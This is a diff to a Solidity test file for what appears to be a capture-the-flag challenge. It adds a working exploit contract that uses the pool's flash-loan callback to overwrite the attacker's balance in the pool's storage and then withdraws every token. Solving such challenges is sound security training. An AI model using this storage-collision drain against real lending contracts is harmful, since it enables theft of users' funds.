@@ -33,17 +33,26 @@ contract Challenge1Test is Test {
         //////////////////////////////*/
 
         //=== this is a sample of flash loan usage
-        FlashLoandReceiverSample _flashLoanReceiver = new FlashLoandReceiverSample();
+        /**FlashLoandReceiverSample _flashLoanReceiver = new FlashLoandReceiverSample();
 
         target.flashLoan(
           address(_flashLoanReceiver),
           abi.encodeWithSignature(
             "receiveFlashLoan(address)", player
           )
-        );
+        );*/
         //===
 
         //============================//
+        Exploit attacker = new Exploit(address(token));
+        uint256 amount = token.balanceOf(address(target));
+        target.flashLoan(
+          address(attacker),
+          abi.encodeWithSignature(
+            "receiveFlashLoan(uint256,address)", amount, address(attacker)
+          )
+        );
+        attacker.pwn(address(target),amount);
 
         vm.stopPrank();
 
@@ -76,4 +85,30 @@ contract FlashLoandReceiverSample {
 
 // @dev this is the solution
 contract Exploit {
+
+    /// @dev Token contract address to be used for lending.
+    //IERC20 immutable public token;
+    IERC20 public token;
+    /// @dev Internal balances of the pool for each user.
+    mapping(address => uint) public balances;
+
+    // flag to notice contract is on a flashloan
+    bool private _flashLoan;
+
+    /// @param _token Address of the token to be used for the lending pool.
+    constructor (address _token) {
+        token = IERC20(_token);
+    }
+    function receiveFlashLoan(uint256 amount, address attacker) public {
+        //_flashLoan = false;
+        balances[attacker] = amount;
+        //We can approve for the attacker
+        //token.approve(attacker,amount);
+    }
+
+    function pwn(address _lending, uint256 amount) public {
+        InSecureumLenderPool(_lending).withdraw(amount);
+        //token.transferFrom(address(_lending), address(this), amount);
+    }
+
 }
